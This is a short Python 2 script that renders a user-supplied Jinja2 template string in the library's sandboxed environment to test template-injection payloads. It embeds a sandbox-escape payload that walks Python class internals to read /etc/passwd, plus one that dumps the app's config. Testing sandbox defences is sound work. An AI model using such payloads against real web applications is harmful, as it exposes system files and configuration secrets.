# !/usr/bin/env python
#  -*- coding: utf-8 -*-
"""
Test your payload with jinja2.sandbox

Usage: python sandbox.py <your_payload>
Example: python sandbox.py {{2+2}}
"""

str1 = """{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}"""
str1 = '{{ config.items() }}'

import sys
from jinja2.sandbox import SandboxedEnvironment

if '-h' in sys.argv:
    print __doc__
else:
    env = SandboxedEnvironment()
    print env.from_string('[Output] {}'.format(sys.argv[1] if len(sys.argv) > 1 else str1)).render()
